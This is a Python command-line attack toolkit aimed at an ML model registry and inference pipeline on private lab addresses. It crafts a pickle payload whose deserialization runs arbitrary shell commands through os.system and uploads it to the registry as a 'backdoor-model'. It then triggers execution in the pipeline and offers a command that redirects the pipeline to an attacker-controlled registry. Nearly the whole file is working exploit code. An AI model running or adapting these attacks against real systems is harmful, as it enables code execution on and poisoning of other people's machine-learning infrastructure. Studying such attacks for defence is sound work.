#!/usr/bin/env python3
"""
AI Supply Chain Attack Toolkit
Model poisoning via pickle RCE, registry manipulation, and S3 abuse.
"""

import httpx
import click
from rich import print
import pickle
import os
import io
import json

REGISTRY_URL = "http://192.168.19.1:8007"
PIPELINE_URL = "http://192.168.19.1:8008"
MINIO_URL = "http://192.168.19.1:9000"


class RCEPayload:
    """Pickle deserialization payload"""

    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))

    def predict(self, X):
        return [0.0]


@click.group()
def cli():
    """Supply Chain Attack Toolkit"""
    pass


@cli.command()
@click.option("--target", default=REGISTRY_URL)
def recon(target):
    """Enumerate models in the registry"""
    print(f"[bold red][*] Registry Recon[/bold red]")

    with httpx.Client(timeout=30.0) as client:
        resp = client.get(f"{target}/models")
    print(json.dumps(resp.json(), indent=2))


@cli.command()
@click.option("--target", default=REGISTRY_URL)
@click.option("--name", default="backdoor-model")
@click.option("--command", default="echo 'PWNED' > /tmp/PWNED && id >> /tmp/PWNED")
def upload_poisoned(target, name, command):
    """Upload a poisoned pickle model to the registry"""
    print(f"[bold red][*] Uploading Poisoned Model[/bold red]")
    print(f"[*] Model name: {name}")
    print(f"[*] Payload command: {command}")

    # Create malicious pickle
    payload = RCEPayload(command)
    pkl_bytes = pickle.dumps(payload)

    files = {"file": (f"{name}.pkl", io.BytesIO(pkl_bytes), "application/octet-stream")}

    with httpx.Client(timeout=30.0) as client:
        resp = client.post(
            f"{target}/models/upload",
            params={"model_name": name, "metadata": json.dumps({"author": "attacker", "version": "1.0"})},
            files=files,
        )
    print(f"\n[green][+] Upload response: {resp.json()}[/green]")


@cli.command()
@click.option("--pipeline-target", default=PIPELINE_URL)
@click.option("--name", default="backdoor-model")
@click.option("--registry", default=REGISTRY_URL)
def trigger_rce(pipeline_target, name, registry):
    """Trigger pickle RCE by running the poisoned model in the pipeline"""
    print(f"[bold red][*] Triggering Pipeline RCE[/bold red]")
    print(f"[*] Model: {name}")
    print(f"[*] Registry: {registry}")

    with httpx.Client(timeout=60.0) as client:
        resp = client.post(
            f"{pipeline_target}/run",
            json={
                "model_name": name,
                "registry_url": registry,
                "input": [[1, 2, 3]],
            },
        )
    print(f"\n[green][+] Pipeline response: {resp.json()}[/green]")
    print(f"\n[yellow][*] Check /tmp/PWNED on the pipeline container for RCE proof[/yellow]")


@cli.command()
@click.option("--pipeline-target", default=PIPELINE_URL)
@click.option("--attacker-registry", required=True, help="URL of attacker-controlled registry")
@click.option("--name", default="legit-model")
def registry_redirect(pipeline_target, attacker_registry, name):
    """Redirect pipeline to pull from attacker-controlled registry"""
    print(f"[bold red][*] Registry Redirect Attack[/bold red]")
    print(f"[*] Redirecting pipeline to: {attacker_registry}")

    with httpx.Client(timeout=60.0) as client:
        resp = client.post(
            f"{pipeline_target}/run",
            json={
                "model_name": name,
                "registry_url": attacker_registry,
                "input": [[1, 2, 3]],
            },
        )
    print(f"\n[green][+] Response: {resp.json()}[/green]")


if __name__ == "__main__":
    cli()
